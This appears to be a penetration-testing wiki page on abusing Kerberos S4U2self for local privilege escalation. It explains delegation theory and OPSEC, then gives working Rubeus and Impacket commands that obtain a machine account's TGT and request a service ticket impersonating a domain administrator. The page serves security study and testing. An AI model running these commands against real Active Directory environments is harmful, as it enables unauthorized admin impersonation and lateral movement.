# S4U2self abuse

## Theory

The following recipe shows how to abuse S4U2self for Local Privilege Escalation, or for stealthier alternative to Silver Ticket. There are also other tricks based on S4U2self, using u2u (user-to-user) as well: [#s4u2self-+-u2u](../#s4u2self-+-u2u "mention").

### Delegation and extensions

Kerberos delegations allow services to access other services on behalf of domain users.

The "Kerberos" authentication protocol features delegation capabilities explained [here](./). Kerberos delegations can be abused by attackers to obtain access to valuable assets and sometimes even escalate to domain admin privileges. Regarding [constrained delegations](constrained.md) and [rbcd](rbcd.md), those types of delegation rely on **Kerberos extensions called** [**S4U2Self and S4U2Proxy**](../#service-for-user-extensions).

Simply put, **Service for User to Self (S4U2self)** allows a service to obtain a Service Ticket, on behalf of a user (called "principal"), to itself.

Last but not least, S4U2self can be used to produce a Service Ticket to oneself on behalf of another domain user, **even if that user is "sensitive for delegation" or member of the Protected Users group**. Consequently, this allows attackers, in very specific scenarios, to escalate their privileges or perform lateral movements.

### Microsoft Virtual Accounts

Since machine accounts have their own set of SPNs by default at their creation, S4U2self can be used by any machine account, without any supplementary configuration. If an attacker manages to execute code as `NT AUTHORITY\NETWORK SERVICE` __ or as any other "Microsoft Virtual Account" (e.g. `defaultapppool` __ or `mssqlservice`) he will be able to escalate his privileges by abusing S4U2self. This happens because this kind of accounts all act on the network as the machine itself.

### OPSEC considerations

The S4U2self abuse is not only a great way to perform Local Privilege Escalation or a lateral move, it's also an way more stealthier alternative to [Silver Tickets](../forged-tickets/#silver-ticket) when an attacker has knowledge of a machine account's Kerberos keys. While a Silver Ticket is a Service Ticket featuring a forged PAC, the Service Ticket issued after an S4U2self request will be legitimate and will feature a valid PAC.

## Practice

In order to obtain local admin rights on a target machine, the attackers must be able to execute code on the machine and conduct two major steps: obtain a TGT for the machine account, and use that TGT to make a S4U2self request in order to obtain a Service Ticket as domain admin for the machine.

```powershell
Rubeus.exe tgtdeleg /nowrap
```

### 1. Machine account's TGT

This step revolves around the `tgtdeleg` feature from [Rubeus](https://github.com/GhostPack/Rubeus) which allows an attacker that has code execution on a machine to ask a TGT, which will be the machine account's TGT (cf. [Microsoft Virtual Accounts](s4u2self-abuse.md#microsoft-virtual-accounts)).

```powershell
Rubeus.exe tgtdeleg /nowrap
```

The TGT can then be used with [Pass the Ticket](../ptt.md) for the next step, which can be conducted remotely if needed, unlike this initial step.

Alternatively, if the machine account credentials are known, a TGT can be requested commonly.

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket)'s [getTGT.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py) (Python) script can be used for that purpose. Howerver, this step is optional if getST.py is to be used later on for the S4U2self request. In this case, with the appropriate arguments, it will request a TGT automatically

```bash
getTGT.py -dc-ip "domaincontroller" -hashes :"NThash" "domain"/"machine$"
```
{% endtab %}

{% tab title="Windows" %}
From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose. Howerver, this step is optional if Rubeus is to be used later on for the S4U2sel requestf. In this case, with the appropriate arguments, Rubeus will request a TGT automatically.

```powershell
Rubeus.exe asktgt /nowrap /domain:"domain" /user:"computer$" /rc4:"NThash"
```
{% endtab %}
{% endtabs %}

### 2. Obtain a Service Ticket

The TGT can then be used along with S4U2self to obtain a Service Ticket impersonating another domain user on the machine.&#x20;

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket)'s getST.py (Python) script can be used for the purpose. If needed, `.kirbi` files can be converted to `.ccache` (cf. [Pass the Ticket](../ptt.md)).

```bash
export KRB5CCNAME="/path/to/ticket.ccache"
getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no -pass -dc-ip "DomainController" "domain.local"/'machine$' 
```
{% endtab %}

{% tab title="Windows" %}
From Windows machines, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for that purpose.

```powershell
Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /altservice:"cifs/machine.domain.local" /ticket:"base64ticket"
```
{% endtab %}
{% endtabs %}

Once a Service Ticket is received, it can be used with [pass-the-ticket](../ptt.md)/[pass-the-cache](../ptc.md) to obtain access to oneself as the "DomainAdmin" (the user can be changed in the request. Attackers should select a domain user which has local admin rights on the machine).

{% hint style="info" %}
This technique can also be used when receiving TGTs during a [Kerberos Unconstrained Delegation abuse](unconstrained.md) in order to gain local admin privileges over the victims.
{% endhint %}

## Resources

{% embed url="https://exploit.ph/delegate-2-thyself.html" %}

{% embed url="https://exploit.ph/revisiting-delegate-2-thyself.html" %}

{% embed url="https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation" %}
